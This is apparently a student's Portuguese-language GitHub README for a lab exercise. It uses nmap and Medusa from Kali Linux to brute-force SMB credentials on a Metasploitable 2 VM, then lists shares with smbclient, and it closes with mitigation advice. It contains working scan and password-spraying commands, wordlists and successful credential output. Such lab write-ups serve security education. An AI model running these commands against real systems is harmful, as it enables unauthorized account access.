# 🛡️ Projeto: Simulação de Ataque de Força Bruta com Medusa e Kali Linux

## 🎯 Objetivo
Este projeto tem como objetivo demonstrar, em ambiente controlado, a execução de um ataque de força bruta utilizando a ferramenta **Medusa** no **Kali Linux**, direcionado a serviços vulneráveis do **Metasploitable 2**, simulando um cenário real de auditoria de segurança.  
Ao final, também são apresentadas recomendações de mitigação.

---

## 🧩 Ambiente de Laboratório

| Sistema | Função | IP | Ferramentas |
|----------|--------|----|-------------|
| Kali Linux | Atacante | 192.168.15.77 | Nmap, Medusa, smbclient |
| Metasploitable 2 | Alvo | 192.168.15.87 | Serviços vulneráveis (FTP, SSH, SMB, etc.) |

**Rede:** Host-Only (VirtualBox)  
**Objetivo:** Simular ataques controlados e documentar os resultados.

---

## 🔍 Etapa 1 – Varredura de Rede com Nmap

O primeiro passo foi identificar os serviços ativos no host alvo:

```bash
sudo nmap -sS 192.168.15.87
```

Resultado principal:
```
21/tcp  open  ftp
22/tcp  open  ssh
23/tcp  open  telnet
25/tcp  open  smtp
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

📸 **Print:** `/images/nmap_scan.png`

---

## 🔎 Etapa 2 – Detecção Detalhada de Serviços

Para obter mais detalhes sobre as versões dos serviços e banners, foi usado:

```bash
sudo nmap -p21-400 -A 192.168.15.87
```

O comando identificou o serviço **vsFTPd 2.3.4** (conhecido por vulnerabilidades antigas) e o **OpenSSH 4.7p1**.

📸 **Print:** `/images/nmap_detalhado.png`

---

## 💣 Etapa 3 – Ataque de Força Bruta SMB (Password Spraying)

Com base nos serviços expostos, foi escolhido o **SMB (porta 445)** para o ataque.  
Foram criados dois arquivos simples:

**Arquivo `smb_users.txt`:**
```
msfadmin
service
user
```

**Arquivo `senhas_spray.txt`:**
```
password
123456
Welcome123
msfadmin
```

Execução do ataque:

```bash
medusa -h 192.168.15.87 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

✅ Resultado:
```
ACCOUNT FOUND: [smbnt] Host: 192.168.15.87 User: msfadmin Password: msfadmin [SUCCESS]
```

📸 **Print:** `/images/medusa_smb_success.png`

---

## 📂 Etapa 4 – Validação do Acesso SMB

Após encontrar as credenciais válidas, foi feita a conexão ao compartilhamento SMB:

```bash
smbclient -L //192.168.15.87 -U msfadmin
```

Resultado:
```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
tmp             Disk      oh noes!
opt             Disk
ADMIN$          IPC       IPC Service (metasploitable server)
msfadmin        Disk      Home Directories
```

📸 **Print:** `/images/smbclient_list.png`

---

## 🧠 Conclusão

O teste simulou com sucesso um ataque de força bruta em ambiente controlado, permitindo a obtenção de credenciais válidas.  
Essa demonstração mostra como senhas fracas e repetidas são facilmente exploráveis.

---

## 🛡️ Recomendações de Mitigação

- Aplicar **políticas de senha forte** (mínimo de 10 caracteres, complexidade e expiração).  
- Implementar **bloqueio de conta** após várias tentativas falhas.  
- Monitorar logs de autenticação e configurar alertas de **intrusão**.  
- Desabilitar serviços desnecessários (como Telnet ou FTP).  
- Utilizar **autenticação multifator (MFA)** sempre que possível.

---

## 📚 Ferramentas Utilizadas

- **Kali Linux 2025.2**
- **Medusa v2.3**
- **Nmap 7.95**
- **Metasploitable 2**
- **smbclient**

---

## 🖼️ Estrutura do Repositório

```
📂 kali-medusa-bruteforce
├── README.md
├── smb_users.txt
├── senhas_spray.txt
└── /images
    ├── nmap_scan.png
    ├── nmap_detalhado.png
    ├── medusa_smb_success.png
    └── smbclient_list.png
```

---

## 👨‍💻 Autor

**Vitor Lopes Fernandes de Souza**  
Estudante de TADS e entusiasta em Cibersegurança  
🔗 [GitHub Profile](https://github.com/)
